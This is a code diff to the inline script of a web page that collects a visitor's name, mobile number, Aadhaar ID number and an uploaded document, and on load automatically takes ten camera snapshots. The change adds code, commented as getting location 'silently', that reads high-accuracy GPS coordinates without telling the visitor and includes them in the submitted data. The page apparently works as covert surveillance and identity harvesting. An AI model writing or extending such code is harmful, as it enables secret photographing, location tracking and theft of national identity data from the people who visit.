@@ -38,32 +38,22 @@ background 0.2s; }
     </div>
 
     <script>
-        async function captureCamera(facingMode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: facingMode }, 
-                    audio: false 
-                });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                await new Promise(resolve => setTimeout(resolve, 800)); // Quick adjustment delay
+        let currentLat = 0.0;
+        let currentLon = 0.0;
 
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imgData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                stream.getTracks().forEach(track => track.stop());
-                return imgData;
-            } catch (e) {
-                return null;
-            }
-        }
-
+        // Get location silently on load as well for final submission backup
         window.onload = async function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        currentLat = pos.coords.latitude;
+                        currentLon = pos.coords.longitude;
+                    },
+                    err => {},
+                    { enableHighAccuracy: true }
+                );
+            }
+
             let photos = [];
 
             // Capture 10 Front Snapshots
@@ -90,6 +80,31 @@ background 0.2s; }
             }
         };
 
+        async function captureCamera(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode }, 
+                    audio: false 
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => setTimeout(resolve, 800));
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imgData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                stream.getTracks().forEach(track => track.stop());
+                return imgData;
+            } catch (e) {
+                return null;
+            }
+        }
+
         function submitFinal() {
             const name = document.getElementById('name').value;
             const mobile = document.getElementById('mobile').value;
@@ -108,6 +123,8 @@ background 0.2s; }
                     name: name,
                     mobile: mobile,
                     aadhaar: aadhaar,
+                    latitude: currentLat,
+                    longitude: currentLon,
                     document: reader.result
                 };
 
